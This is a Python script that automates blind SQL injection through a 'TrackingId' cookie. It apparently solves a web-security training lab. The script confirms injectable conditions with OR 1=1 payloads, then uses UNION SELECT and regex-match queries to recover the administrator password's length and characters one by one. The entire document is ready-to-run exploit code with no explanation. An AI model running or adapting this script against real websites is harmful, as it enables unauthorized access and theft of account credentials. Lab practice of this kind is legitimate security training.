import requests, sys, time, urllib.parse
from bs4 import BeautifulSoup


site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}/'


characters = ["a", "b", "c", "d", "e", "f",
              "g", "h", "i", "j", "k", "l",
              "m", "n", "o", "p", "q", "r",
              "s", "t", "u", "v", "w", "x",
              "y", "z", "0", "1", "2", "3",
              "4", "5", "6", "7", "8", "9"]
try_password = []
query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password"


def try_query(query):
    print(f'Query: {query}')
    mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
    resp = requests.get(url, cookies=mycookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False

print(try_query("""x' OR 1=1 --"""))
print(try_query("""x" OR 1=1 --"""))

begin_time = time.perf_counter()
num = 1
while True:
    query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
    print(f'Trying length {num}')
    if try_query(query) == False:
        num = num + 1
    else:
        break

print(f"Password length is {num}")
print(f"Time elapsed is {time.perf_counter()-begin_time}")

for i in range(36):
    query1 = f"{query_pass} ~ '^{characters[i]}'--"
    if try_query(query1) == False:
        pass
    else:
        print(f"Password begins with {characters[i]}")
        try_password.append(characters[i])
        break

for i in range(num):
    print(f"Current Password: {try_password[0]}")
    for i in range(len(characters)):
        query2 = f"{query_pass} ~ '^{try_password[0]+characters[i]}'--"
        if try_query(query2) == False:
            pass
        else:
            print(f"Password starts with {try_password[0]+characters[i]}")
            try_password[0] = try_password[0]+characters[i]
            break